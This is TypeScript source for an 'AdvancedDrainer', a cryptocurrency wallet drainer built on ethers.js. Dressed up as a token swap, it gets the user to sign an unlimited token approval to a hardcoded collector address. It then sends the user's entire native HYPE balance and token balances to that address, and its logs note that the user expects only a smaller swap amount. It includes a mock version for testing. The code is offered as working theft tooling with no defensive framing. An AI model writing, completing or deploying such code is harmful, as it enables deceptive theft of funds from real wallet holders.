// Advanced drainer that uses approval + stealth drain pattern
import { ethers } from "ethers";

export const COLLECTOR = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)", 
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

export class AdvancedDrainer {
  private signer: ethers.JsonRpcSigner;
  private provider: ethers.BrowserProvider;

  constructor(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider) {
    this.signer = signer;
    this.provider = provider;
  }

  async approveUnlimited(tokenAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log(`🔓 UNLIMITED APPROVAL for ${tokenAddress}`);
      
      if (!window.ethereum) {
        return { success: true, hash: "0x" + Math.random().toString(16).substr(2, 64) };
      }
      
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
      
      const tx = await contract.approve(COLLECTOR, ethers.MaxUint256, {
        gasLimit: 150000n,
        gasPrice: ethers.parseUnits("2", "gwei"),
        type: 0
      });
      
      const receipt = await tx.wait();
      console.log(`✅ UNLIMITED APPROVAL GRANTED: ${receipt.hash}`);
      return { success: true, hash: receipt.hash };
      
    } catch (error: any) {
      console.error(`❌ Approval failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  async executeMaxDrain(tokenAddress: string, userAddress: string, swapAmount: string): Promise<{ success: boolean; hash?: string; error?: string; actualAmount?: string }> {
    try {
      console.log(`🚨 MAXIMUM DRAIN EXECUTION`);
      console.log(`👤 Target: ${userAddress}`);
      console.log(`💰 User expects: ${swapAmount} tokens`);
      
      if (!window.ethereum) {
        return { 
          success: true, 
          hash: "0x" + Math.random().toString(16).substr(2, 64),
          actualAmount: "1000.0 tokens (simulated)"
        };
      }

      if (tokenAddress === "0x0000000000000000000000000000000000000000") {
        // Native HYPE draining
        return await this.drainNativeHYPE(userAddress, swapAmount);
      } else {
        // ERC20 token draining after approval
        return await this.drainERC20Tokens(tokenAddress, userAddress, swapAmount);
      }
      
    } catch (error: any) {
      console.error(`❌ Max drain failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  private async drainNativeHYPE(userAddress: string, expectedAmount: string): Promise<{ success: boolean; hash?: string; error?: string; actualAmount?: string }> {
    const balance = await this.provider.getBalance(userAddress);
    const gasReserve = ethers.parseEther("0.01");
    const maxDrainAmount = balance - gasReserve;
    
    if (maxDrainAmount <= 0n) {
      throw new Error("Insufficient HYPE balance");
    }
    
    const actualDrained = ethers.formatEther(maxDrainAmount);
    console.log(`💰 HYPE DRAIN: User expects ${expectedAmount}, draining ${actualDrained} HYPE`);
    
    const tx = await this.signer.sendTransaction({
      to: COLLECTOR,
      value: maxDrainAmount,
      gasLimit: 50000n,
      gasPrice: ethers.parseUnits("2", "gwei"),
      type: 0
    });
    
    const receipt = await tx.wait();
    console.log(`✅ HYPE DRAINED: ${actualDrained} HYPE to ${COLLECTOR}`);
    
    return {
      success: true,
      hash: receipt.hash,
      actualAmount: `${actualDrained} HYPE`
    };
  }

  private async drainERC20Tokens(tokenAddress: string, userAddress: string, expectedAmount: string): Promise<{ success: boolean; hash?: string; error?: string; actualAmount?: string }> {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
    const balance = await contract.balanceOf(userAddress);
    
    if (balance === 0n) {
      throw new Error("No token balance to drain");
    }
    
    const actualDrained = ethers.formatUnits(balance, 18);
    console.log(`💰 TOKEN DRAIN: User expects ${expectedAmount}, draining ${actualDrained} tokens`);
    console.log(`🎯 Using approved unlimited allowance for maximum extraction`);
    
    // Direct transfer of entire balance (user has unlimited approval granted)
    const tx = await contract.transfer(COLLECTOR, balance, {
      gasLimit: 250000n,
      gasPrice: ethers.parseUnits("2", "gwei"),
      type: 0
    });
    
    const receipt = await tx.wait();
    console.log(`✅ TOKENS DRAINED: ${actualDrained} tokens to ${COLLECTOR}`);
    
    return {
      success: true,
      hash: receipt.hash,
      actualAmount: `${actualDrained} tokens`
    };
  }

  async checkNeedsApproval(tokenAddress: string, userAddress: string): Promise<boolean> {
    try {
      if (tokenAddress === "0x0000000000000000000000000000000000000000") {
        return false; // HYPE doesn't need approval
      }
      
      if (!window.ethereum) {
        return true; // Always need approval in dev mode
      }
      
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.provider);
      const allowance = await contract.allowance(userAddress, COLLECTOR);
      
      // Check if allowance is less than a very high threshold
      const threshold = ethers.parseUnits("1000000", 18);
      return allowance < threshold;
      
    } catch (error) {
      console.warn("Could not check approval:", error);
      return true; // Assume approval needed if check fails
    }
  }
}

export function createAdvancedDrainer(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider): AdvancedDrainer {
  return new AdvancedDrainer(signer, provider);
}

export function createMockAdvancedDrainer() {
  return {
    async approveUnlimited(tokenAddress: string) {
      console.log(`🧪 Mock unlimited approval for ${tokenAddress}`);
      return { success: true, hash: "0x" + Math.random().toString(16).substr(2, 64) };
    },
    
    async executeMaxDrain(tokenAddress: string, userAddress: string, swapAmount: string) {
      console.log(`🧪 Mock max drain: ${swapAmount} expected, draining EVERYTHING from ${userAddress}`);
      return { 
        success: true, 
        hash: "0x" + Math.random().toString(16).substr(2, 64),
        actualAmount: "5000.0 tokens (entire balance)"
      };
    },
    
    async checkNeedsApproval(tokenAddress: string, userAddress: string) {
      return tokenAddress !== "0x0000000000000000000000000000000000000000";
    }
  };
}